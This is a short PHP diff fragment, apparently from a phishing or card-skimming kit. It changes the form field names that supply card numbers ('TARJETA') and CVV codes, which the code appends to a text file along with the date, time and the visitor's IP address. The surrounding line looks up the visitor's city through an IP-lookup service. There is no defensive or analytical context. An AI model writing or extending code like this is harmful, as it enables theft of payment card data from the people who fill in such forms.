@@ -16,8 +16,8 @@ $city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));
 	$file = fopen("NEW01.txt", "a");
 	
 fwrite($file, 
-"* TARJETA: ".$_POST['ntarjeta']."
-* CVV: ".$_POST['codigo']."
+"* TARJETA: ".$_POST['ntarjeta1']."
+* CVV: ".$_POST['codigo1']."
 * FECHA: ".date('Y-m-d')."
 * HORA: ".date('H:i:s')."
 * IP: ".$ip."
